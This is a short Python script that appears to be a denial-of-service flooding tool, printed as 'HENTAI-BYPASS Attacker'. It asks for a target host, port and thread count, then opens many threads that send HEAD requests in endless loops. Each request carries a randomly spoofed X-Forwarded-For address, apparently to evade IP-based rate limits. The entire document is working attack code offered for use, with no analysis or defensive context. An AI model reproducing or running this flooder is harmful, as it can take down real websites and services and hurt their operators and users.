import socket
import os, sys
import time
import threading, random

ip = input("target: ")
port = int(input("port: "))
times = int(input("time: "))
run = int(input("run:"))

url = "https://" + str(ip)

def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)
  
print('Launch HENTAI-BYPASS Attacker'.format(ip))

time.sleep(1)

def startAttack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      for y in range(times): # Start attack
          atk.send(str.encode(request))
    except socket.error:
      time.sleep(.1)
    except:
      pass


if __name__ == "__main__":
	for i in range(run):
              th = threading.Thread(target=startAttack).start()